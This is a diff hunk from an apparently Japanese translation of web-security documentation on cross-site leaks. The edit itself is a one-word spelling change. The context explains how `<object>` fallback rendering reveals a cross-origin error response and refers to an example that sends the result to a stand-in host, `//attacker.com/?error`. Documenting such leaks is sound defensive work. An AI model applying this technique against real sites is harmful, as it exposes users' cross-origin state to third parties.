@@ -121,7 +121,7 @@ window.Array.prototype.push = function() {
 JavaScriptが無効な場合でも、クロスオリジンのリソースに関するいくつかの情報が漏えいする可能性があります。
 例えば、`<object>` を利用して、リソースがエラーコードで応答するかどうかを検出することができます。
 リソース`//example.org/resource`が`<object data=//example.org/resource>fallback</object>`でエラーを返した場合、`fallback`がレンダリングされます[^fallback] [^leaky-images]。
-内部に別の`<object>`を挿入して情報を外部サーバーにリークしたり、CSS[^xsleaks-nojs]で検出したりすることができます。
+内部に別の`<object>`を挿入して情報を外部サーバにリークしたり、CSS[^xsleaks-nojs]で検出したりすることができます。
 以下のコードは `//example.org/404` を埋め込み、それが *Error* で応答した場合、 フォールバックとして`//attacker.com/?error` へのリクエストも行われます。
 
 ```html
